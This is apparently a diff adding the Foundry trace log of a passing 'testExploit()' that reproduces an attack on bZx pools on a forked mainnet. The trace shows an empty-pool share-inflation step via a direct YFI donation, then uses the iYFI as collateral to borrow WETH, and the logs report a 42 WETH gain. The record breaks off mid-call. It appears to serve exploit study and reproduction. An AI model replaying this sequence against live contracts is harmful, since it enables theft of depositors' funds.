@@ -1,0 +1,748 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/bZx_exp.sol:ContractTest
+[PASS] testExploit() (gas: 2690446)
+Logs:
+  Exploiter WETH balance before attack: 0.000000000000000000
+  Total underlying assets in the pool before deposit/mint: 0
+  Total shares before deposit/mint: 0
+  Total underlying assets in the pool after deposit/mint: 5
+  Total shares after deposit/mint: 5
+  Exploiter shares: 5
+  Exploiter WETH balance after attack: 42.027208518991148756
+
+Traces:
+  [9983] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("mainnet", 18695728 [1.869e7])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(YFI_WETH: [0x088ee5007C98a9677165D78dD2109AE4a3D04d0C], "YFI_WETH")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(YFI: [0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e], "YFI")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], "iYFI")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(iETH: [0xB983E01458529665007fF7E0CDdeCDB74B967Eb6], "iETH")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(iWBTC: [0x2ffa85f655752fB2aCB210287c60b9ef335f5b6E], "iWBTC")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], "WETH")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(bzX: [0xD8Ee69652E4e4838f2531732a46d1f7F584F0b7f], "bzX")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(SushiRouter: [0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F], "SushiRouter")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(UniRouter: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], "UniRouter")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [3032246] ContractTest::testExploit()
+    ├─ [0] VM::deal(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   └─ ← [Return]
+    ├─ [2534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ emit log_named_decimal_uint(key: "Exploiter WETH balance before attack", val: 0, decimals: 18)
+    ├─ [2541] YFI::balanceOf(YFI_WETH: [0x088ee5007C98a9677165D78dD2109AE4a3D04d0C]) [staticcall]
+    │   └─ ← [Return] 193638163090625604314 [1.936e20]
+    ├─ [3006230] YFI_WETH::swap(19363816309062560431 [1.936e19], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x30)
+    │   ├─ [28152] YFI::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 19363816309062560431 [1.936e19])
+    │   │   ├─ emit Transfer(from: YFI_WETH: [0x088ee5007C98a9677165D78dD2109AE4a3D04d0C], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 19363816309062560431 [1.936e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0 → 0x0000000000000000000000000000000000000000000000010cba1856d596eaaf
+    │   │   │   @ 0xe472d763fa6e21c4bc485331b1fa769ff11eb41648bd707203be1d4bdf0eadd1: 0x00000000000000000000000000000000000000000000000a7f44f36457e52ada → 0x000000000000000000000000000000000000000000000009728adb0d824e402b
+    │   │   └─ ← [Return] true
+    │   ├─ [2940746] ContractTest::uniswapV2Call(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 19363816309062560431 [1.936e19], 0, 0x30)
+    │   │   ├─ [24665] YFI::approve(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xfcdc09f86af6a625bcb08ac33c295ca7d23fe8a622f3e77c7c81493161b98981: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [0] VM::prank(0x03b7Bb750A974e0BD34795013F66B669f4110e54)
+    │   │   │   └─ ← [Return]
+    │   │   ├─ [225506] iYFI::fallback(0x03b7Bb750A974e0BD34795013F66B669f4110e54, 5)
+    │   │   │   ├─ [220257] LoanTokenLogicStandard::burn(0x03b7Bb750A974e0BD34795013F66B669f4110e54, 5) [delegatecall]
+    │   │   │   │   ├─ [150759] bzX::fallback(0x0000000000000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [145421] 0xaECAD4373Dc7fD95c37cb56446B8DD9dD1394811::settleInterest(0x0000000000000000000000000000000000000000000000000000000000000000) [delegatecall]
+    │   │   │   │   │   │   ├─ [1601] 0x6Ae6CECaa083F7245abf8F96e79d338C6fB297fA::getTickAtSqrtRatio(100000000000000000 [1e17]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] -547992 [-5.479e5]
+    │   │   │   │   │   │   ├─ [1166] 0x6Ae6CECaa083F7245abf8F96e79d338C6fB297fA::getSqrtRatioAtTick(-824316 [-8.243e5]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 99995396451 [9.999e10]
+    │   │   │   │   │   │   ├─ [57840] iYFI::fallback(0, 0, 99995396451 [9.999e10]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [57085] LoanTokenLogicStandard::_nextBorrowInterestRate(0, 0, 99995396451 [9.999e10]) [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ [2541] YFI::balanceOf(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b]) [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 5
+    │   │   │   │   │   │   │   │   ├─ [42414] 0xFbdD8919c8B2ad0Ea06da5ca8BC4d3e29cf3D2e4::calculateIR(0, 99995396451 [9.999e10]) [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000016345785d8a0000
+    │   │   │   │   │   │   │   │   └─ ← [Return] 100000000000000000 [1e17]
+    │   │   │   │   │   │   │   └─ ← [Return] 100000000000000000 [1e17]
+    │   │   │   │   │   │   ├─ emit PoolInterestRateVals(pool: iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], poolPrincipalTotal: 0, poolInterestTotal: 0, poolRatePerTokenStored: 15553424974632166412988330796549974631 [1.555e37], poolNextInterestRate: 100000000000000000 [1e17])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x35e110657ec6e5dd682ababa2b113be2eba81035106811713febb6afaabfab2b: 0x000000000000000000000000000000000bb3738d5a9d0a5b1f03b2f30f3a93ce → 0x000000000000000000000000000000000bb37b0e79f5cb59c2bbd1f369a0aa67
+    │   │   │   │   │   │   │   @ 0xca4f7761f868f6466da8eaa322ff27c35b588b66c6ff7dbe3f6813359cc62860: 0x00000000000000000000000000000000000000000000000000000000656a9407 → 0x00000000000000000000000000000000000000000000000000000000656a95e7
+    │   │   │   │   │   │   │   @ 0x6fa9bac0b33ae4f0106c8b29fbd299a82fdf2c3c197ab5988a0ce74683d86d39: 0 → 0x000000000000000000000000000000000000f7a368ffdb381cf03c34656a95e7
+    │   │   │   │   │   │   │   @ 0xfa7115d07f3755bc3029bb27929dd4bdaca83ed18b9ca59258dc57886829dfe7: 1 → 2
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   ├─ [7038] bzX::fallback(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b]) [staticcall]
+    │   │   │   │   │   ├─ [1727] LoanSettings::getPoolPrincipalStored(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [541] YFI::balanceOf(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 5
+    │   │   │   │   ├─ [541] YFI::balanceOf(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 5
+    │   │   │   │   ├─ emit Transfer(from: 0x03b7Bb750A974e0BD34795013F66B669f4110e54, to: 0x0000000000000000000000000000000000000000, value: 5)
+    │   │   │   │   ├─ emit Burn(burner: 0x03b7Bb750A974e0BD34795013F66B669f4110e54, tokenAmount: 5, assetAmount: 5, price: 1000000000000000000 [1e18])
+    │   │   │   │   ├─ [28152] YFI::transfer(0x03b7Bb750A974e0BD34795013F66B669f4110e54, 5)
+    │   │   │   │   │   ├─ emit Transfer(from: iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], to: 0x03b7Bb750A974e0BD34795013F66B669f4110e54, value: 5)
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x4d1ce252c697641189b56f452dfbeecdfdbe03d1836a257724a757d04c142988: 0 → 5
+    │   │   │   │   │   │   @ 0x7c940df096504eaad90733b4c77033f7fadb8d304b63a0626b28983c613c695f: 5 → 0
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x8466dc74131d3ebf4c250e263f40ff54d1357e9c9f6a9007e9dcd5dfeca4b11a: 5 → 0
+    │   │   │   │   │   @ 19: 5 → 0
+    │   │   │   │   └─ ← [Return] 5
+    │   │   │   └─ ← [Return] 5
+    │   │   ├─ [541] YFI::balanceOf(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b]) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit log_named_uint(key: "Total underlying assets in the pool before deposit/mint", val: 0)
+    │   │   ├─ [344] iYFI::totalSupply() [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit log_named_uint(key: "Total shares before deposit/mint", val: 0)
+    │   │   ├─ [69310] iYFI::fallback(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5)
+    │   │   │   ├─ [68582] LoanTokenLogicStandard::mint(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5) [delegatecall]
+    │   │   │   │   ├─ [17635] bzX::fallback(0x0000000000000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [16797] 0xaECAD4373Dc7fD95c37cb56446B8DD9dD1394811::settleInterest(0x0000000000000000000000000000000000000000000000000000000000000000) [delegatecall]
+    │   │   │   │   │   │   ├─ [1601] 0x6Ae6CECaa083F7245abf8F96e79d338C6fB297fA::getTickAtSqrtRatio(100000000000000000 [1e17]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] -547992 [-5.479e5]
+    │   │   │   │   │   │   ├─ [1082] 0x6Ae6CECaa083F7245abf8F96e79d338C6fB297fA::getSqrtRatioAtTick(-812034 [-8.12e5]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 184785084890 [1.847e11]
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   ├─ [2538] bzX::fallback(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b]) [staticcall]
+    │   │   │   │   │   ├─ [1727] LoanSettings::getPoolPrincipalStored(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [541] YFI::balanceOf(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [6272] YFI::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], 5)
+    │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], value: 5)
+    │   │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], value: 115792089237316195423570985008687907853269984665640564039457584007913129639930 [1.157e77])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x0000000000000000000000000000000000000000000000010cba1856d596eaaf → 0x0000000000000000000000000000000000000000000000010cba1856d596eaaa
+    │   │   │   │   │   │   @ 0x7c940df096504eaad90733b4c77033f7fadb8d304b63a0626b28983c613c695f: 0 → 5
+    │   │   │   │   │   │   @ 0xfcdc09f86af6a625bcb08ac33c295ca7d23fe8a622f3e77c7c81493161b98981: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffa
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 5)
+    │   │   │   │   ├─ emit Mint(minter: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenAmount: 5, assetAmount: 5, price: 1000000000000000000 [1e18])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 19: 0 → 5
+    │   │   │   │   │   @ 0x16102f891729262ce67210a124a159646f7714794acb4ed5a594ecb524124440: 0 → 5
+    │   │   │   │   └─ ← [Return] 5
+    │   │   │   └─ ← [Return] 5
+    │   │   ├─ [541] YFI::balanceOf(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b]) [staticcall]
+    │   │   │   └─ ← [Return] 5
+    │   │   ├─ emit log_named_uint(key: "Total underlying assets in the pool after deposit/mint", val: 5)
+    │   │   ├─ [344] iYFI::totalSupply() [staticcall]
+    │   │   │   └─ ← [Return] 5
+    │   │   ├─ emit log_named_uint(key: "Total shares after deposit/mint", val: 5)
+    │   │   ├─ [531] iYFI::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 5
+    │   │   ├─ emit log_named_uint(key: "Exploiter shares", val: 5)
+    │   │   ├─ [541] YFI::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 19363816309062560426 [1.936e19]
+    │   │   ├─ [541] YFI::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 19363816309062560426 [1.936e19]
+    │   │   ├─ [0] VM::record()
+    │   │   │   └─ ← [Return]
+    │   │   ├─ [541] YFI::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 19363816309062560426 [1.936e19]
+    │   │   ├─ [0] VM::accesses(YFI: [0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e])
+    │   │   │   └─ ← [Return] [0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03], []
+    │   │   ├─ [0] VM::load(YFI: [0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e], 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03) [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000010cba1856d596eaaa
+    │   │   ├─ [0] VM::load(YFI: [0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e], 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03) [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000010cba1856d596eaaa
+    │   │   ├─ [541] YFI::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 19363816309062560426 [1.936e19]
+    │   │   ├─ [0] VM::store(YFI: [0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e], 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03, 0x0000000000000000000000000000000000000000000000000000000000000000)
+    │   │   │   └─ ← [Return]
+    │   │   ├─ [541] YFI::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ [0] VM::store(YFI: [0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e], 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03, 0x0000000000000000000000000000000000000000000000010cba1856d596eaaa)
+    │   │   │   └─ ← [Return]
+    │   │   ├─ emit SlotFound(who: YFI: [0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e], fsig: 0x70a08231, keysHash: 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03, slot: 43395567998282996429510105732813622026225105309595388710023329053794126379779 [4.339e76])
+    │   │   ├─ [0] VM::load(YFI: [0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e], 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03) [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000010cba1856d596eaaa
+    │   │   ├─ [0] VM::store(YFI: [0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e], 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03, 0x0000000000000000000000000000000000000000000000010cba1856d596eaaf)
+    │   │   │   └─ ← [Return]
+    │   │   ├─ [541] YFI::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 19363816309062560431 [1.936e19]
+    │   │   ├─ [541] YFI::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 19363816309062560431 [1.936e19]
+    │   │   ├─ [6252] YFI::transfer(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], 19363816309062560431 [1.936e19])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], value: 19363816309062560431 [1.936e19])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x7c940df096504eaad90733b4c77033f7fadb8d304b63a0626b28983c613c695f: 5 → 0x0000000000000000000000000000000000000000000000010cba1856d596eab4
+    │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x0000000000000000000000000000000000000000000000010cba1856d596eaaf → 0
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [25897] iYFI::fallback(iETH: [0xB983E01458529665007fF7E0CDdeCDB74B967Eb6], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ [25179] LoanTokenLogicStandard::approve(iETH: [0xB983E01458529665007fF7E0CDdeCDB74B967Eb6], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
+    │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: iETH: [0xB983E01458529665007fF7E0CDdeCDB74B967Eb6], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xe379f7eb600014902fece96c1a5eaa145c84bb18e9f9880ef7054647c50f1a1a: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [2534] WETH::balanceOf(iETH: [0xB983E01458529665007fF7E0CDdeCDB74B967Eb6]) [staticcall]
+    │   │   │   └─ ← [Return] 38089742649328258427 [3.808e19]
+    │   │   ├─ [881457] iETH::borrow(0x0000000000000000000000000000000000000000000000000000000000000000, 38089742649328258427 [3.808e19], 0, 5, iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   ├─ [876185] 0x9712dC729916e154Daa327C36ad1b9f8E069fBA1::borrow(0x0000000000000000000000000000000000000000000000000000000000000000, 38089742649328258427 [3.808e19], 0, 5, iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x) [delegatecall]
+    │   │   │   │   ├─ [146708] bzX::fallback(0x0000000000000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [145870] 0xaECAD4373Dc7fD95c37cb56446B8DD9dD1394811::settleInterest(0x0000000000000000000000000000000000000000000000000000000000000000) [delegatecall]
+    │   │   │   │   │   │   ├─ [1601] 0x6Ae6CECaa083F7245abf8F96e79d338C6fB297fA::getTickAtSqrtRatio(100000000000000000 [1e17]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] -547992 [-5.479e5]
+    │   │   │   │   │   │   ├─ [1110] 0x6Ae6CECaa083F7245abf8F96e79d338C6fB297fA::getSqrtRatioAtTick(-547992 [-5.479e5]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 99995264265221703 [9.999e16]
+    │   │   │   │   │   │   ├─ [39756] iETH::_nextBorrowInterestRate(92262817296835465574 [9.226e19], 0, 99995264265221703 [9.999e16]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [39001] 0x9712dC729916e154Daa327C36ad1b9f8E069fBA1::_nextBorrowInterestRate(92262817296835465574 [9.226e19], 0, 99995264265221703 [9.999e16]) [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ [534] WETH::balanceOf(iETH: [0xB983E01458529665007fF7E0CDdeCDB74B967Eb6]) [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 38089742649328258427 [3.808e19]
+    │   │   │   │   │   │   │   │   ├─ [28792] 0xFbdD8919c8B2ad0Ea06da5ca8BC4d3e29cf3D2e4::calculateIR(70779444097561630127 [7.077e19], 99995264265221703 [9.999e16]) [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000016345785d8a0000
+    │   │   │   │   │   │   │   │   └─ ← [Return] 100000000000000000 [1e17]
+    │   │   │   │   │   │   │   └─ ← [Return] 100000000000000000 [1e17]
+    │   │   │   │   │   │   ├─ emit PoolInterestRateVals(pool: iETH: [0xB983E01458529665007fF7E0CDdeCDB74B967Eb6], poolPrincipalTotal: 92236913432903558923 [9.223e19], poolInterestTotal: 38843089640450250 [3.884e16], poolRatePerTokenStored: 81351730760685784615882604008117706707 [8.135e37], poolNextInterestRate: 100000000000000000 [1e17])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0xecf4270b1f260b474c78d6196d93d49df4ecce9462a42636d1b69093a3bf085e: 0x000000000000000000000000000000003c61b263912f6335bf341d2f7621ec01 → 0x000000000000000000000000000000003d33c5ff81b90d266d895ca5456d1fd3
+    │   │   │   │   │   │   │   @ 0xcd3e4bf23fedbc80b6549ef28446db2e8d1b408decd0eb2edbd92310353bf957: 0x00000000000000000000000000000000000000000000000000000000653618db → 0x00000000000000000000000000000000000000000000000000000000656a95e7
+    │   │   │   │   │   │   │   @ 0x5e59d98f563d00a07eb43a19c1445d19f48df935dc1a3c792782435a1e813dfc: 0 → 0x000000000000000000000000000000000000f7a368ffe4503e7b2d5b656a95e7
+    │   │   │   │   │   │   │   @ 0xae67e6e0f25b4f651ee9682a4087c205a3b4c2ace4407b3c05277c1185619e9d: 78 → 79
+    │   │   │   │   │   │   │   @ 0x5683bfd20472e24354894bb20e1f6ca1ba21bac90be976d5e337b9c7c7f1bc08: 0x000000000000000000000000000000000000000000000000006641241ff7d9bb → 0x0000000000000000000000000000000000000000000000000089ff958fff68ca
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   ├─ [534] WETH::balanceOf(iETH: [0xB983E01458529665007fF7E0CDdeCDB74B967Eb6]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 38089742649328258427 [3.808e19]
+    │   │   │   │   ├─ [12013] WETH::withdraw(38089742649328258427 [3.808e19])
+    │   │   │   │   │   ├─ [73] iETH::fallback{value: 38089742649328258427}()
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─ emit Withdrawal(src: iETH: [0xB983E01458529665007fF7E0CDdeCDB74B967Eb6], wad: 38089742649328258427 [3.808e19])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x4221ce27c0ff024fe62c07f21e28fbc5534696689a4dd5f17b9fffb25b8a0a18: 0x0000000000000000000000000000000000000000000000021099f321a741cd7b → 0
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [55] ContractTest::receive{value: 38089742649328258427}()
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [29459] iYFI::fallback(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], bzX: [0xD8Ee69652E4e4838f2531732a46d1f7F584F0b7f], 5)
+    │   │   │   │   │   ├─ [28735] LoanTokenLogicStandard::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], bzX: [0xD8Ee69652E4e4838f2531732a46d1f7F584F0b7f], 5) [delegatecall]
+    │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: bzX: [0xD8Ee69652E4e4838f2531732a46d1f7F584F0b7f], value: 5)
+    │   │   │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: iETH: [0xB983E01458529665007fF7E0CDdeCDB74B967Eb6], value: 115792089237316195423570985008687907853269984665640564039457584007913129639930 [1.157e77])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x16102f891729262ce67210a124a159646f7714794acb4ed5a594ecb524124440: 5 → 0
+    │   │   │   │   │   │   │   @ 0x6d04141ac5829843ee56592e8ca7359578402175753dee6e04e521ddffbc8257: 0 → 5
+    │   │   │   │   │   │   │   @ 0xe379f7eb600014902fece96c1a5eaa145c84bb18e9f9880ef7054647c50f1a1a: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffa
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [657607] bzX::fallback(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], 0xcbcfeb6595b7007c09a69b0971cf031c31542fdeaa266c6af95cd8bc8ddb62c8, true, 0, [0xB983E01458529665007fF7E0CDdeCDB74B967Eb6, 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, 0x0000000000000000000000000000000000000000], [0, 38089742649328258427 [3.808e19], 0, 0, 5], 0x)
+    │   │   │   │   │   ├─ [652169] 0xF426F2609784541653Cc351485592E82e57DcB58::borrowOrTradeFromPool(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], 0xcbcfeb6595b7007c09a69b0971cf031c31542fdeaa266c6af95cd8bc8ddb62c8, true, 0, [0xB983E01458529665007fF7E0CDdeCDB74B967Eb6, 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, 0x0000000000000000000000000000000000000000], [0, 38089742649328258427 [3.808e19], 0, 0, 5], 0x) [delegatecall]
+    │   │   │   │   │   │   ├─ [54911] 0x09Ef93750C5F33ab469851F022C1C42056a8BAda::queryRate(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [377] iYFI::loanTokenAddress() [staticcall]
